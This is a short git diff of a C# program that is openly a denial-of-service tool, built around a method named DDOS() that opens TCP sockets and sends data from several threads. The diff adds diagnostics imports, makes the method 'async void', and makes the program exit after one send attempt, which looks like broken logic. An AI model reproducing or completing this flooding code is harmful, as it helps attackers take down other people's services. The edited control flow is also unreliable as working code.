@@ -6,6 +6,8 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Text.RegularExpressions;
 using System.Security.Cryptography;
+using System.Diagnostics.Tracing;
+using System.Diagnostics;
 
 class Program
 {
@@ -52,7 +54,7 @@ class Program
             t.Start();
         }
     }
-    static void DDOS()
+    static async void DDOS()
     {
     reclient:
         socket = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
@@ -97,12 +99,12 @@ class Program
         {
             socket.Send(data);
             isErr = 0;
-            return;
+            Environment.Exit(0);
         }
         catch(Exception)
         {
             isErr = 1;
-            return;
+            Environment.Exit(0);
         }
     }
 }
